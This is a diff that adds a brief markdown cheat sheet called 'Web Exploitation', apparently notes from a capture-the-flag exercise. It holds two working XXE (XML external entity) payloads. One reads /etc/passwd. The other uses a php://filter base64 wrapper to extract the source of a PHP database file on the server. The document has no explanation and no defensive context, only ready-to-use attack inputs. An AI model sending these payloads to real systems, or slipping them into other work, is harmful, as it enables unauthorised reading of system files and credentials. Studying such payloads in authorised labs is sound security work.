@@ -1,0 +1,26 @@
+# Web Exploitation
+
+## XXE:
+
+### To Test:
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>test</cwe>
+		<cvss>test</cvss>
+		<reward>test</reward>
+		</bugreport>
+
+### To Get PHP File
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
+<bugreport>
+<title>test</title>
+ <cwe>test</cwe>
+ <cvss>test</cvss>
+ <reward>&file;</reward>
+</bugreport>
